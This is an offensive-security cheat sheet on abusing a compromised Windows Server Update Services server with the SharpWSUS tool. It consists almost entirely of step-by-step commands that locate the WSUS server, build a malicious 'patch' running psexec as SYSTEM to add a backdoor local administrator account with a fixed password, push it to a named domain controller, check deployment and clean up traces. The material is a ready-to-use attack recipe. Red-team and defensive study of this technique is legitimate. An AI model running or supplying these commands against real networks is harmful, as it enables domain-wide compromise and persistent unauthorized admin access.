# Deployment - WSUS

> Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network

:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.

* [SharpWSUS](https://github.com/nettitude/SharpWSUS)

1. Locate using `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` or `SharpWSUS.exe locate`
2. After WSUS Server compromise: `SharpWSUS.exe inspect`
3. Create a malicious patch: `SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
4. Deploy it on the target: `SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
5. Check status deployment: `SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
6. Clean up: `SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`